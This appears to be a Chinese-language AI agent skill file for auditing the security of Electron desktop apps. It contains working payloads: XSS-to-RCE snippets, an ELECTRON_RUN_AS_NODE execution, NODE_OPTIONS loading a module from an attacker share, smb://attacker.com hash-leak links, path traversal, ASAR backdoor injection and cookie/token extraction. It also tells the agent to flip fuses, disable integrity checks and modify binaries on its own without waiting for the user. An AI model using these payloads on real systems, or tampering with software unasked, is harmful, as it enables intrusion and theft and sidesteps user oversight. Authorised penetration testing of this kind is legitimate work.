---
name: electron-audit
version: "2.0"
description: Electron 桌面应用全攻击面安全审计 v2.0。聚焦真实可利用漏洞，消除误报。支持 asar 解包、exe 内嵌 app 提取、DevTools 强开与反调试绕过、JS Bridge 利用、协议处理器 RCE、XSS→RCE 链、Fuse 滥用、DLL 劫持、本地数据窃取。每个漏洞点必须证明可利用性。
  TRIGGER when: 用户提到 Electron 安全审计、Electron 漏洞挖掘、asar 解包分析、Electron 应用渗透、桌面应用安全测试，或要求检查 Electron 应用的安全配置、敏感信息泄露、XSS、RCE、伪协议、JS Bridge、DLL 劫持等。包括"审计这个 Electron 应用"、"扫一下这个桌面程序"、"看看这个 asar 有没有问题"、"Electron 安全检查"。
  DO NOT TRIGGER when: 用户只是想开发 Electron 应用、打包 Electron、或处理非安全相关的 Electron 问题。
argument-hint: [Electron 应用路径或 asar 文件路径]
---

# Electron 全攻击面安全审计

对 **$ARGUMENTS** 执行完整渗透式安全审计。

**目标**: 系统化发现 Electron 应用中的**可复现、可验证的高风险安全漏洞**，每个漏洞点提供 PoC。

---

## 漏洞分级标准

| 等级 | CVSS 3.1 | 定义 | 典型场景 |
|:-----|:---------|:-----|:---------|
| **严重 (C)** | 9.0-10.0 | 无需交互即可 RCE，或无条件窃取用户凭证 | nodeIntegration:true + XSS → `require('child_process').exec()` |
| **高危 (H)** | 7.0-8.9 | 需少量交互的 RCE，或大量敏感数据泄露 | shell.openExternal 无校验 → 任意程序执行 |
| **中危 (M)** | 4.0-6.9 | 受限的代码执行或信息泄露 | CSP 缺失 + contextBridge 暴露面过大 |
| **低危 (L)** | 0.1-3.9 | 信息泄露但无直接利用路径 | Source Map 泄露、内部 API 端点暴露 |

- 漏洞编号格式: `{C/H/M/L}-ELECTRON-{序号}`
- 可利用性评估: 每个漏洞必须标注 **已验证** / **待验证** / **理论可行**

---

## 检测范围边界

**本技能检测范围仅包含以下类型：**
- ✅ 远程代码执行 (RCE) — XSS→RCE、协议处理器 RCE、shell.openExternal 滥用
- ✅ JS Bridge 利用 — contextBridge 暴露面、IPC 通道注入、preload 逃逸
- ✅ 客户端二进制攻击 — Fuse 滥用、DLL 劫持、ASAR 篡改
- ✅ 敏感数据泄露 — 本地存储明文凭证、日志泄露、源码泄露
- ✅ 安全配置缺陷 — nodeIntegration/contextIsolation/sandbox/CSP/webSecurity
- ✅ 导航劫持 — will-navigate/will-redirect 缺失、loadURL 注入
- ✅ 反调试绕过 — DevTools 检测绕过、debugger 循环绕过

**以下不属于本技能检测范围：**
- ❌ 业务逻辑漏洞（除非直接导致 RCE）
- ❌ 服务端漏洞（API 接口安全由专项工具处理）
- ❌ 代码质量问题（命名、风格、性能）
- ❌ 合规性检查（GDPR、隐私政策）

---

## ⚠️ 误报过滤规则（CRITICAL — 违反任一条则该漏洞不得出现在报告中）

**本技能的核心原则：宁可漏报一个低危，不可误报一个高危。每个报告的漏洞必须经过以下过滤。**

### 规则 1: 数据可控性验证
- **MAC 地址、硬件 ID、系统信息** 等由操作系统 API 返回的值，**不是攻击者可控的输入**
- 如果一个"漏洞"的利用前提是"攻击者控制了 MAC 地址返回值"，这不是漏洞，因为 MAC 地址来源于系统 API，攻击者无法注入
- **只有以下来源才算攻击者可控**: URL 参数、用户输入框、IPC 消息（来自被 XSS 的渲染进程）、Deep Link 参数、剪贴板（有限）、拖拽文件
- 凡是 Source 不可控的 Sink，不得报为 XSS/注入漏洞

### 规则 2: CVE 实际影响评估
- **禁止盲报 CVE**：不是"版本低于修复版本"就自动算漏洞
- 每个报告的 CVE 必须回答：
  1. **该应用是否触及了该 CVE 的攻击面？** 例如，V8 类型混淆 CVE 需要应用加载不受信任的 JS 代码（如访问外部网页或用户输入的 HTML）
  2. **在该应用的安全配置下，利用该 CVE 能做什么？** 例如 sandbox:true + contextIsolation:true 下，V8 RCE 的影响被大幅削弱
  3. **是否有公开可用的 exploit/PoC？** 仅有 CVE 编号但无公开利用方式的，降级为"供应链风险-建议升级"而非"严重漏洞"
- **版本风险统一放在"供应链风险"章节，不得作为独立的严重/高危漏洞上报**，除非能证明在此应用上下文中有直接可利用路径

### 规则 3: 理论漏洞 vs 实际漏洞
- **"如果攻击者能做 X，则可以做 Y"——如果 X 本身已经是高权限操作，则 Y 不是新漏洞**
  - 例："如果攻击者能修改 node_modules 中的库"→ 这需要本地文件写入权限，已经可以做更多事情
  - 例："如果供应链被攻击"→ 这是供应链安全问题，不是应用自身的漏洞
- **本地提权类问题需明确攻击场景**: DLL 劫持需要说明谁在什么场景下会把 DLL 放到目标目录
- **Fuse 已关闭的攻击面不再报为漏洞**: 如果 RunAsNode=off，则不报 ELECTRON_RUN_AS_NODE 相关问题

### 规则 4: 重复漏洞合并
- 同一根因导致的多个攻击路径，合并为一个漏洞（可列多个 PoC）
- 例：contextIsolation:false 导致的多种逃逸方式 → 一个漏洞，多种利用链
- 版本相关的多个 CVE → 合并为"版本风险"一项放在供应链章节

### 规则 5: 严重程度校准
- **严重 (C)**: 无需用户交互即可 RCE，且攻击者有可行的触发路径（如应用加载外部内容）
- **高危 (H)**: 需要用户点击/交互的 RCE，或大范围数据泄露
- **中危 (M)**: 受限的代码执行、需多步利用链、或信息泄露有明确利用场景
- **低危 (L)**: 信息泄露但无直接利用路径、防御纵深缺失
- **不报**: 纯理论风险、需要物理访问+管理员权限的攻击、不可控输入的注入

---

## EXE 内嵌应用检测与提取（CRITICAL — 许多应用使用此打包方式）

### 问题背景
许多 Electron 应用使用 electron-builder 的 `asar: { smartUnpack: true }` 或 electron-packager 的自定义配置，将 app.asar **嵌入到 exe 文件本身**而非放在 resources/ 目录。特征：
- `resources/app.asar` 存在但**体积极小**（几 KB 到几百 KB），与 exe 文件大小（通常 100MB+）严重不匹配
- `resources/app.asar` 内只有一个简单的 `main.js`（加载器/启动器），真正的业务代码在 exe 中
- exe 文件异常大（超过 150MB），远超标准 Electron 空壳（~130MB）

### 检测流程（在 Phase 0A 中执行）

```
1. 获取文件大小对比:
   - ls -la resources/app.asar → 记录大小
   - ls -la *.exe → 记录大小
   - 如果 app.asar < 1MB 且 exe > 150MB → 高度怀疑 app 内嵌于 exe

2. 快速验证 app.asar 内容:
   - npx @electron/asar list resources/app.asar → 如果只有几个文件 → 确认是启动器
   - 解包后检查 main.js 是否只是 require 真正入口或加载内部资源

3. 从 exe 中提取内嵌 app:
   方法 A — 搜索 asar 魔数:
     node -e "
     const fs = require('fs');
     const buf = fs.readFileSync('app.exe');
     // asar 文件以 4 字节大小头开始，后跟 JSON header
     // 搜索大的 asar 签名（跳过已知的小 resources/app.asar）
     const results = [];
     for (let i = 0; i < buf.length - 16; i++) {
       // asar header: UInt32LE(4) + UInt32LE(headerSize) + ...
       // 通常 header 以 '{"files":' 开头
       if (buf.slice(i, i+9).toString() === '{\"files\":') {
         results.push({ offset: i, preview: buf.slice(i, i+100).toString() });
       }
     }
     console.log(JSON.stringify(results, null, 2));
     "

   方法 B — 7zip 解压 exe（NSIS/Squirrel 安装包）:
     7z x app.exe -oextracted/
     → 在 extracted/ 中递归搜索 *.asar

   方法 C — 运行时提取（最可靠）:
     启动应用后用 --remote-debugging-port=9222 连接
     在 Console 中执行:
       require('fs').readdirSync(require('path').dirname(process.execPath))
       require('fs').readdirSync(require('path').join(process.resourcesPath))
       process.mainModule.filename  → 真正的入口文件路径

   方法 D — strings 搜索 exe 中的 JS 代码:
     strings app.exe | grep -E "(require\(|ipcMain|BrowserWindow|contextBridge)" | head -50
     → 如果找到大量 JS 代码片段，确认 app 内嵌于 exe

4. 如果确认内嵌:
   - 优先使用方法 C（运行时提取），因为可以直接在 DevTools 中审计
   - 对 resources/app.asar 中的启动器代码也要审计（可能有安全问题）
   - 在报告中注明"应用代码内嵌于 exe，静态分析范围受限"
   - 将重点转向 Phase 2 运行时分析 + Phase 3 二进制攻击
```

### 如果无法提取

```
当 app 内嵌于 exe 且无法提取时：
1. 审计 resources/app.asar 中的启动器代码（虽小但可能有问题）
2. 通过 --remote-debugging-port 运行时分析
3. 通过 DevTools Sources 面板查看已加载的所有 JS
4. 通过 DevTools Network 面板观察所有网络请求
5. 通过 DevTools Application 面板检查本地存储
6. Fuse 检查和 DLL 劫持检测不受影响（都是二进制层面的）
7. 在报告"不可审计项"中说明无法静态分析的范围
```

---

## 核心要求

**此技能必须对每个攻击面执行完整检测，不允许省略。**
**此技能必须主动解决遇到的所有障碍，不允许等用户指示。**

- ✅ 每个漏洞提供可复现的 PoC 或验证步骤
- ✅ 每个高危以上漏洞进行数据流分析（Source → Sink）
- ✅ 区分「已验证」和「待验证」漏洞
- ✅ 所有发现按风险等级排序
- ✅ **Fuse 挡路就 flip Fuse，ASAR 校验挡路就关校验，签名挡路就忽略签名 — 主动解决**
- ✅ **备份原始文件后大胆修改，不要怕"破坏"应用**
- ❌ 禁止只列理论风险不给验证方法
- ❌ 禁止跳过 DevTools 强开步骤
- ❌ 禁止忽略 .jsc 文件（标记为不可审计项，运行时再分析）
- ❌ **禁止在报告中写"不可审计"而不先穷尽所有绕过手段**
- ❌ **禁止等用户下达指令才去解决技术障碍 — 你是渗透测试者，自己想办法**

---

## 审计分层模型

```
Phase 0: 侦察与防御绕过
  ├── 0A. 保护机制识别（Fuses / ASAR 校验 / bytenode / 混淆）
  └── 0B. DevTools 强开 + 反调试绕过（必须完成才能进入后续阶段）

Phase 1: 静态分析（无需运行应用）
  ├── 1A. asar 解包 + 敏感信息扫描
  ├── 1B. 安全配置审计（webPreferences / CSP / Fuses）
  └── 1C. 代码漏洞面定位（XSS Sink / IPC Handler / 协议 Handler）

Phase 2: 攻击链构造（需要运行应用）
  ├── 2A. JS Bridge 利用（contextBridge / IPC / preload 逃逸）
  ├── 2B. 协议处理器 + shell.openExternal → RCE
  ├── 2C. XSS → RCE 完整链
  └── 2D. 导航劫持 + 远程内容加载

Phase 3: 客户端二进制攻击
  ├── 3A. Fuse 滥用（RunAsNode / --inspect / NODE_OPTIONS）
  ├── 3B. DLL 劫持检测
  └── 3C. ASAR 篡改持久化

Phase 4: 本地数据窃取
  ├── 4A. Cookie / LocalStorage / IndexedDB 提取
  ├── 4B. 日志文件敏感信息
  └── 4C. 缓存与临时文件分析

Phase 5: 供应链与版本风险
  ├── 5A. NPM 依赖 CVE 扫描
  ├── 5B. Electron/Chromium 版本 → 已知 1-day
  └── 5C. 自动更新机制 MITM
```

**每个 Phase 独立可执行，按顺序推进。发现高危以上问题立即报告。**

---

## Phase 0: 侦察与防御绕过

**目标**: 识别保护机制，确保 DevTools 稳定可用。DevTools 是后续所有运行时分析的前提。

### 0A. 保护机制识别

```
1. 定位应用文件:
   - 找到 exe/app 可执行文件
   - 找到 resources/app.asar（或 app/ 目录）
   - 检查是否存在 resources/app.asar.unpacked/
   
   ★ EXE 内嵌检测（必做）:
   - 检查 app.asar 大小 vs exe 大小
   - 如果 app.asar < 1MB 且 exe > 150MB → 执行"EXE 内嵌应用检测与提取"流程
   - 这种情况下 app.asar 只是启动器，真正的代码在 exe 中

2. 检查 Electron Fuses:
   npx @electron/fuses read path/to/electron.exe
   重点关注:
   - RunAsNode              → on = 可用 ELECTRON_RUN_AS_NODE 直接 RCE
   - EnableNodeCliInspectArguments → on = 可用 --inspect 附加调试器
   - EnableEmbeddedAsarIntegrityValidation → on = 修改 asar 后会崩溃
   - OnlyLoadAppFromAsar    → off = 可用目录替换 asar

3. 识别代码保护类型:
   - .jsc 文件 → bytenode 编译，静态不可审计，运行时处理
   - _0x 前缀变量 → OB 混淆，需要 ast-deobfuscate 技能
   - .wasm 文件 → WebAssembly，标记
   - 加密/压缩的 JS → 识别加密方式
```

### 0B. DevTools 强开（必须自主完成，不得等用户指示）

**详细手册**: `$SKILL_DIR/references/DEVTOOLS_BYPASS.md`

**核心原则: DevTools 开不了是你的问题，不是用户的问题。不要在报告里写"不可审计"然后等用户来解决。你必须自己把 DevTools 打开。**

```
★★★ 自动化执行流程（按顺序自动推进，无需用户确认）★★★

Step 1 — 检查 exe 签名:
  powershell -c "Get-AuthenticodeSignature 'app.exe' | Select Status"
  
  签名状态决定后续策略:
  - NotSigned → 直接 flip Fuse，零风险（绝大多数内部/企业应用都没签名）
  - Valid → flip Fuse 后签名失效，应用仍可运行，但 Windows 会提示"未知发布者"
  - 无论哪种，都继续推进

Step 2 — Flip 关键 Fuse（自动执行）:
  # 开启远程调试能力
  npx @electron/fuses write --app "app.exe" EnableNodeCliInspectArguments=on
  
  # 关闭 ASAR 完整性校验（为后续改 asar 做准备）
  npx @electron/fuses write --app "app.exe" EnableEmbeddedAsarIntegrityValidation=off
  
  # 验证 Fuse 状态
  npx @electron/fuses read --app "app.exe"

Step 3 — 注入 openDevTools 到 asar:
  # 备份原始 asar
  cp resources/app.asar resources/app.asar.bak
  
  # 解包
  npx @electron/asar extract resources/app.asar /tmp/app_mod
  
  # 在 main.js 中找到 BrowserWindow 创建后的位置，取消 openDevTools 注释
  # 或者在 app.on('ready', ...) / new BrowserWindow 之后注入:
  #   mainWindow.webContents.openDevTools();
  # 或者在 main.js 顶部注入通用强开代码:
  #   const { app } = require('electron');
  #   app.on('browser-window-created', (_, win) => { win.webContents.openDevTools(); });
  
  # 重打包
  npx @electron/asar pack /tmp/app_mod resources/app.asar

Step 4 — 验证:
  方式 A: 直接启动 exe → DevTools 应自动弹出
  方式 B: exe --remote-debugging-port=9222 → 浏览器打开 http://127.0.0.1:9222

⚠️ 如果 Step 2 的 npx @electron/fuses 命令不可用:
  → 手动搜索 exe 二进制中的 Fuse 哨兵字符串 [REDACTED_SECRET]
  → 哨兵后跟的字节就是各 Fuse 的状态（0=off, 1=on）
  → 直接用十六进制编辑器翻转对应字节
```

**以下是过去犯过的错误，不得重犯：**
- ❌ 看到 Fuse 锁了就放弃，在报告写"不可审计" → 用户会骂你
- ❌ 等用户说"帮我强开 F12" → 你应该在 Phase 0 自动完成
- ❌ 只报告理论上怎么开 DevTools 但不动手 → 必须实际操作
- ❌ 担心改 exe/asar 会"破坏"应用 → 备份了原文件就行

**Phase 0 完成标准**: DevTools 稳定打开，Console/Network/Sources 面板均可正常使用。**如果完成不了，说明你还没试完所有方法。**

---

## Phase 1: 静态分析

### 1A. 解包 + 敏感信息扫描

```
1. 解包:
   npx @electron/asar extract app.asar app_extracted/
   - 只关注 app.asar 本身，不扫描 extraResources/dll/exe

2. 敏感信息扫描:
   - 扫描规则集: $SKILL_DIR/rules/sensitive_patterns.txt
   - 用 Grep 逐类扫描，排除 node_modules/
   - 重点: API Key、JWT、数据库连接串、私钥、内网地址

3. Source Map 检查:
   - 搜索 .js.map 文件
   - 若存在，还原完整源码
   - 这是最有价值的发现之一

4. .env 和配置文件:
   - 搜索 .env / config.json / settings.json 等
   - 检查是否包含生产环境凭证
```

### 1B. 安全配置审计

**详细手册**: `$SKILL_DIR/references/CONFIG_AUDIT.md`

```
1. BrowserWindow webPreferences 检查:
   搜索: new BrowserWindow / webPreferences
   [严重] nodeIntegration: true         → XSS = 直接 RCE
   [严重] contextIsolation: false       → 原型链污染逃逸
   [高危] webSecurity: false            → 禁用 SOP，跨域 + file:// 读取
   [高危] sandbox: false（显式设置）     → 渲染进程无沙箱
   [中危] allowRunningInsecureContent   → MITM 注入

2. Preload 脚本审计:
   搜索: contextBridge.exposeInMainWorld
   [严重] 暴露 require / child_process / fs → 直接 RCE
   [严重] 暴露通用 IPC（channel 用户可控）→ 调用任意主进程功能
   [高危] 暴露 shell.openExternal（无 URL 校验）→ 任意程序执行

3. IPC 通道审计:
   搜索: ipcMain.handle / ipcMain.on
   [严重] handler 直接 exec(args.cmd) / spawn(args.program)
   [高危] handler 直接 fs.readFile(args.path) / fs.writeFile(args.path)
   [高危] handler 未做 sender 验证

4. CSP 策略:
   [高危] 无 CSP / unsafe-inline / unsafe-eval
   注意: nodeIntegration:true 时 CSP 对 require() 无效

5. Electron Fuses:
   [严重] RunAsNode=on → ELECTRON_RUN_AS_NODE=1 直接 RCE
   [高危] EnableNodeCliInspectArguments=on → --inspect 调试注入

6. 版本风险:
   Electron 版本 → Chromium 版本 → 已知 CVE
   参考: $SKILL_DIR/references/ELECTRON_CVE_DATABASE.md
```

### 1C. 代码漏洞面定位

```
用 Grep 批量扫描以下 Pattern，记录文件和行号:

[XSS Sink]
  innerHTML / outerHTML / document.write / insertAdjacentHTML
  v-html / dangerouslySetInnerHTML / $(selector).html()
  eval / Function() / setTimeout(string) / setInterval(string)

[IPC Handler]
  ipcMain.handle / ipcMain.on
  → 逐个检查 handler 内部是否有命令注入/路径穿越/代码执行

[协议 Handler]
  protocol.registerFileProtocol / protocol.handle
  app.setAsDefaultProtocolClient
  → 标记所有自定义协议入口

[危险 API 调用]
  shell.openExternal / executeJavaScript
  win.loadURL / webview (带 src 属性)
  → 检查参数是否用户可控

[导航事件]
  will-navigate / will-redirect / setWindowOpenHandler
  → 检查是否存在且校验是否严格
```

---

## Phase 2: 攻击链构造

### 2A. JS Bridge 利用

**详细手册**: `$SKILL_DIR/references/JS_BRIDGE_EXPLOIT.md`

```
此阶段需要 DevTools 可用，在 Console 中执行验证。

1. 探测暴露的 Bridge:
   在 Console 中执行全局对象枚举脚本（见手册）
   常见命名: window.electronAPI / window.api / window.bridge / window.ipc

2. 枚举 Bridge 方法:
   Object.keys(window.electronAPI).forEach(m => console.log(m, typeof window.electronAPI[m]))

3. 逐个方法测试:
   - 文件读写类: 路径穿越 → ../../etc/passwd 或 ../../../../Windows/System32/drivers/etc/hosts
   - 命令执行类: 直接注入 → ; calc 或 | calc
   - 通用 IPC 类: 枚举可用 channel → 寻找危险操作
   - URL 打开类: 注入 file:// 或 smb:// 协议

4. 如果 contextIsolation: false:
   → 原型链污染攻击（见手册 2.2 节）
   → 通过 preload 的 require 获取 child_process

每个发现的可利用方法必须提供完整 PoC。
```

### 2B. 协议处理器 + shell.openExternal → RCE

**详细手册**: `$SKILL_DIR/references/PROTOCOL_RCE.md`

```
1. 识别自定义协议:
   搜索: setAsDefaultProtocolClient / protocol.registerFileProtocol / protocol.handle
   记录协议名称（如 myapp://）

2. 协议参数注入测试:
   路径穿越:  myapp://file?path=../../../../etc/passwd
   JS 注入:   myapp://navigate?url=javascript:alert(document.cookie)
   命令注入:  myapp://run?action=;calc
   任意导航:  myapp://open?url=file:///C:/Windows/System32/

3. shell.openExternal 测试:
   搜索所有 shell.openExternal 调用
   检查参数是否经过 URL 白名单校验
   测试 Payload:
     file:///C:/Windows/System32/cmd.exe
     smb://attacker.com/share  （NTLM hash 泄露）
     \\attacker.com\share       （UNC 路径）
     ms-msdt:/id PCWDiagnostic  （Follina 类攻击）

4. 超链接 RCE:
   在聊天/评论等富文本区域输入:
     <a href="file:///C:/Windows/System32/calc.exe">click</a>
     <a href="smb://attacker.com/share">click</a>
   检查点击后是否直接打开
```

### 2C. XSS → RCE 完整链

**详细手册**: `$SKILL_DIR/references/XSS_TO_RCE.md`

```
根据 Phase 1C 定位的 XSS Sink，构造完整利用链:

场景 1: nodeIntegration: true
  <img src=x onerror="require('child_process').exec('calc')">
  → 直接 RCE，不需要任何其他条件

场景 2: contextIsolation: false + preload 有 require
  → 原型链污染逃逸 → 获取 require → RCE

场景 3: contextBridge 暴露了危险 API
  <img src=x onerror="window.electronAPI.execute('calc')">

场景 4: contextBridge 暴露了通用 IPC
  <img src=x onerror="window.electronAPI.send('shell-exec', 'calc')">

每个场景的完整 PoC 见详细手册。
```

### 2D. 导航劫持

```
1. 检查 will-navigate 监听:
   搜索: will-navigate / will-redirect / setWindowOpenHandler
   如果缺失 → 渲染进程可自由导航到恶意页面

2. 验证:
   Console 中执行: location.href = 'https://evil.com'
   如果导航成功 → 可加载恶意页面
   如果 nodeIntegration: true → 恶意页面直接 RCE

3. window.open 测试:
   Console: window.open('file:///C:/Windows/System32/')
   检查是否弹出新窗口且可访问本地文件
```

---

## Phase 3: 客户端二进制攻击

**详细手册**: `$SKILL_DIR/references/FUSE_BINARY_EXPLOIT.md`

```
3A. Fuse 滥用:

  [RunAsNode] 验证 PoC:
    set ELECTRON_RUN_AS_NODE=1
    app.exe -e "require('child_process').execSync('calc')"
    → 如果弹出计算器 = 严重漏洞

  [--inspect] 验证 PoC:
    app.exe --inspect=9229
    → 浏览器访问 chrome://inspect 连接
    → 在调试器中执行任意代码

  [NODE_OPTIONS] 验证 PoC:
    set NODE_OPTIONS=--require=\\attacker\share\malicious.js
    app.exe
    → 加载远程恶意模块

3B. DLL 劫持:
  使用 Process Monitor 监控应用启动
  筛选 "NAME NOT FOUND" 的 DLL 加载
  在应用目录放置同名恶意 DLL
  重启应用验证是否加载

3C. ASAR 篡改持久化:
  如果 OnlyLoadAppFromAsar=off 且 EnableEmbeddedAsarIntegrityValidation=off:
    解包 asar → 注入后门代码 → 重打包
    → 应用每次启动自动执行后门
```

---

## Phase 4: 本地数据窃取

**详细手册**: `$SKILL_DIR/references/LOCAL_DATA_ANALYSIS.md`

```
4A. 本地存储数据提取:

  定位数据目录:
    Windows: %APPDATA%/应用名/ 或 %LOCALAPPDATA%/应用名/
    macOS: ~/Library/Application Support/应用名/
    Linux: ~/.config/应用名/

  检查项:
    Cookies (SQLite) → sqlite3 Cookies "SELECT * FROM cookies"
      [严重] 明文 session token / JWT
    Local Storage (LevelDB) → leveldb-dump 或 DevTools Application 面板
      [高危] access_token / refresh_token / 用户密码
    IndexedDB → DevTools Application 面板
      [中危] 聊天记录 / 业务数据

4B. 日志文件:
  搜索 *.log 文件
  [高危] 日志中包含 token/密码/API Key
  [中危] 日志中包含完整 HTTP 请求（含认证头）

4C. 缓存:
  Cache/ GPUCache/ 目录
  [中危] API 响应缓存包含敏感数据
```

---

## Phase 5: 供应链与版本风险

**详细手册**: `$SKILL_DIR/references/SUPPLY_CHAIN.md`

```
⚠️ 本章节的发现不得作为独立的严重/高危漏洞上报。
   统一放在报告的"供应链风险"章节，给出升级建议。
   只有当你能证明某个 CVE 在此应用上下文中有直接可利用路径时，
   才可以在"漏洞详情"章节单独列出并给 PoC。

5A. NPM 依赖:
  npm audit --json（需要 package-lock.json）
  重点关注: node-serialize / vm2 / lodash < 4.17.21
  ⚠️ npm audit 报告的漏洞大部分在 Electron 桌面应用场景下无法触发
     必须检查该依赖是否真的被应用代码调用、是否在攻击面上

5B. 版本风险:
  Electron 版本 → Chromium 版本 → 已知 CVE
  参考: $SKILL_DIR/references/ELECTRON_CVE_DATABASE.md
  
  ⚠️ CVE 报告纪律:
  - 不要列出所有理论上影响该 Chromium 版本的 CVE
  - 只关注: (1) 有公开 exploit 的 (2) 该应用能触及攻击面的
  - 对于加载外部 URL 的应用：V8 RCE + 沙箱逃逸链 值得关注
  - 对于纯本地应用：Chromium CVE 通常不可触发
  - 报告格式: "建议升级到 Electron X.Y.Z+（当前版本落后 N 个大版本）"

5C. 自动更新:
  搜索: electron-updater / autoUpdater
  [高危] 更新服务器使用 HTTP → MITM 可注入恶意更新
  [高危] 未校验更新包签名
```

---

## 执行策略

### 整体流程

```
1. Phase 0 先行（不可跳过）
   → DevTools 必须可用才能进行后续运行时分析

2. Phase 1 静态分析
   → 完成后进入计划模式，根据发现调整后续重点
   → 发现 nodeIntegration:true → 直接构造 XSS→RCE

3. Phase 2-5 按风险优先级推进
   → 高危发现立即报告，不等全部完成
```

### Subagent 并行策略

```
Phase 1 可并行:
  - 1A 敏感信息扫描 / 1B 配置审计 / 1C 漏洞面定位（三者互不依赖）

Phase 2 可并行:
  - 2A JS Bridge / 2B 协议处理器 / 2C XSS→RCE / 2D 导航（四者互不依赖）

Phase 3 可并行:
  - 3A Fuse 滥用 / 3B DLL 劫持（互不依赖）

Phase 5 可并行:
  - 5A NPM audit / 5B 版本风险 / 5C 更新机制（互不依赖）
```

### .jsc 文件处理策略

```
.jsc 文件（bytenode 编译）无法静态分析:
  1. Phase 1 仅记录 .jsc 文件清单和位置
  2. Phase 2 通过 DevTools 运行时分析:
     - Hook 模块的 exports
     - 在 IPC 调用处设断点
     - 通过 Network 面板观察行为
  3. 不要对 .jsc 用 Grep（二进制文件）
```

---

## 反模式（CRITICAL — 每条都是过去审计踩过的坑）

| 反模式 | 后果 | 正确做法 |
|:-------|:-----|:---------|
| 跳过 Phase 0 | 遇到 ASAR 校验或反调试浪费大量时间 | 先完成侦察和 DevTools 强开 |
| 盲目扫描 .jsc | 二进制文件扫不出东西 | 标记后运行时分析 |
| 只看 main.js | 渲染进程的 webpack chunk 才是 XSS 主战场 | 搜索所有 JS 文件 |
| 忽略 Source Map | .map 文件可还原完整源码 | 发现 .map 立即还原 |
| 忽略子应用 | Electron 可内嵌其他 Electron 子应用 | 每个子应用独立审计 |
| 忽略版本 | 低版本 Chromium 有大量 1-day | 第一时间检查版本 |
| 忽略本地缓存 | %APPDATA% 下常有明文凭证 | 必查 Cookie/LevelDB |
| 只报理论风险 | 用户无法验证 | 每个高危必须给 PoC |
| 对 node_modules 做深度扫描 | 浪费时间且噪声大 | 只做 npm audit，不逐文件扫描 |
| **把不可控数据报为注入源** | **误报，浪费用户时间** | **验证 Source 是否攻击者可控** |
| **盲报 CVE** | **报出大量无实际影响的"严重漏洞"** | **评估 CVE 在此应用上下文中的实际影响** |
| **忽略 exe 内嵌 app** | **只审计了启动器，漏掉真正的业务代码** | **Phase 0 检查 asar/exe 大小比** |
| **把已关闭的 Fuse 报为漏洞** | **误报** | **Fuse=off 的攻击面不报** |
| **把需要管理员权限的攻击报为高危** | **夸大风险** | **攻击前提已是高权限则降级或不报** |

---

## 输出格式

**严格按照 `$SKILL_DIR/references/OUTPUT_TEMPLATE.md` 中的填充式模板生成报告。**

```
{应用名}_electron_audit_{YYYYMMDD_HHMMSS}.md
```

### 报告结构

```
[Electron 安全审计报告]

〇、审计概览
  应用名称 / Electron 版本 / Chromium 版本
  保护机制 / 审计范围 / DevTools 状态

一、风险统计
  X 严重 / Y 高危 / Z 中危 / W 低危

二、漏洞详情（按风险等级排序）
  每个漏洞包含:
  - 编号、等级、标题
  - 漏洞描述（Source → Sink 数据流）
  - 验证 PoC（可直接复现）
  - 影响范围
  - 修复建议

三、安全配置审计结果
四、敏感信息泄露清单
五、供应链风险
六、不可审计项（.jsc 等）
七、修复优先级建议
```

---

## 验证检查清单

**在标记审计完成前，必须逐项检查：**

### Phase 0 检查
- [ ] Electron Fuses 已读取并分析
- [ ] DevTools 稳定可用
- [ ] 保护机制已全部识别

### Phase 1 检查
- [ ] asar 已解包
- [ ] 敏感信息扫描已使用完整规则集
- [ ] 所有 BrowserWindow webPreferences 已检查
- [ ] 所有 preload 脚本已审计
- [ ] 所有 IPC handler 已审计
- [ ] CSP 策略已检查
- [ ] Electron/Chromium 版本已记录

### Phase 2 检查
- [ ] JS Bridge 暴露面已枚举并测试
- [ ] 自定义协议 handler 已审计
- [ ] shell.openExternal 所有调用点已检查
- [ ] XSS Sink 已全部扫描
- [ ] 导航事件监听已检查

### Phase 3 检查
- [ ] RunAsNode Fuse 已验证
- [ ] --inspect Fuse 已验证
- [ ] DLL 劫持风险已评估

### Phase 4 检查
- [ ] 本地存储数据已检查（Cookie/LocalStorage/IndexedDB）
- [ ] 日志文件已扫描

### 报告质量检查
- [ ] 所有高危以上漏洞有可复现的 PoC
- [ ] 所有漏洞标注了可利用性状态
- [ ] 不可审计项已明确列出
- [ ] 修复建议按优先级排序

---

## 参考资料

- [DEVTOOLS_BYPASS.md](references/DEVTOOLS_BYPASS.md) — DevTools 强开与反调试绕过
- [CONFIG_AUDIT.md](references/CONFIG_AUDIT.md) — 安全配置审计详解
- [JS_BRIDGE_EXPLOIT.md](references/JS_BRIDGE_EXPLOIT.md) — JS Bridge 利用手册
- [PROTOCOL_RCE.md](references/PROTOCOL_RCE.md) — 协议处理器与 shell.openExternal RCE
- [XSS_TO_RCE.md](references/XSS_TO_RCE.md) — XSS → RCE 攻击链
- [FUSE_BINARY_EXPLOIT.md](references/FUSE_BINARY_EXPLOIT.md) — Fuse 滥用与二进制攻击
- [LOCAL_DATA_ANALYSIS.md](references/LOCAL_DATA_ANALYSIS.md) — 本地数据窃取
- [ELECTRON_CVE_DATABASE.md](references/ELECTRON_CVE_DATABASE.md) — Electron CVE 数据库
- [OUTPUT_TEMPLATE.md](references/OUTPUT_TEMPLATE.md) — 输出报告模板
- [sensitive_patterns.txt](rules/sensitive_patterns.txt) — 敏感信息扫描规则集